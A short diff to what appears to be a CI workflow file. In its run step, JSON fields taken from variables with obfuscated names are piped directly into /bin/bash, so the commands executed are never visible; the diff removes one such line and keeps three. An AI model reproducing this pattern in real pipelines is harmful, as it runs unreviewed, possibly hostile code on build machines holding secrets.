@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$y438" | jq -r .ry128 | /bin/bash
           echo $lp91 | jq -r .rynyp3 | /bin/bash
-          echo $auw9 | jq -r .l964 | /bin/bash
           printf '%s' "$abq2" | jq -r .rjdw47 | /bin/bash
 
       - name: Archive results
